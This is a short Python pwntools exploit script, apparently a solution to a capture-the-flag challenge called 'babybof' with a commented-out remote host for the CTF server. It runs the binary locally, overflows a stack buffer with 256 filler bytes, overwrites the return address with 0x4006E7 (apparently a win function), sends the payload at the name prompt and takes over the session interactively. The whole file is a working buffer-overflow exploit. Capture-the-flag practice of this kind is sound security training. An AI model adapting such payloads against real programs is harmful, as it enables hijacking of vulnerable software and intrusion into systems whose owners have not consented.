from pwn import *

context(log_level = "debug")

p=process('./babybof')
#p=remote('chals20.cybercastors.com', 14425)
pop_rdi=0x00000000004007f3
#gdb.attach(p, "b *0x4007c4")
#raw_input()
payload ='a'*256
#payload += pop_rdi
payload += p64(0x4006E7)
p.recvuntil('Say your name: ')
p.sendline(payload)

p.interactive()

